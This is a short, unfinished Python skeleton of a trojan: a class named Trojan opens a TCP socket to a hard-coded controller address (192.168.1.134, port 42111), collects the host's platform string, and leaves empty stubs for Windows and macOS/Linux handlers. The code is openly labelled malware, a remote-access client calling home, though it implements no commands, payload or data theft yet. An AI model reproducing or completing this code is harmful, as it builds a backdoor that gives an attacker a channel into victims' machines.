import socket
import platform


class Trojan():

    def __init__(self):

        self.server = "192.168.1.134"
        self.port = 42111

        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


    def conn(self):

        self.socket.connect((self.server, self.port))



    def system(self):

        self.system = platform.platform()


    def mac_linux(self):

        pass


    def windows(self):

        pass










if __name__ == "__main__":
    trojan = Trojan()
    trojan.conn()
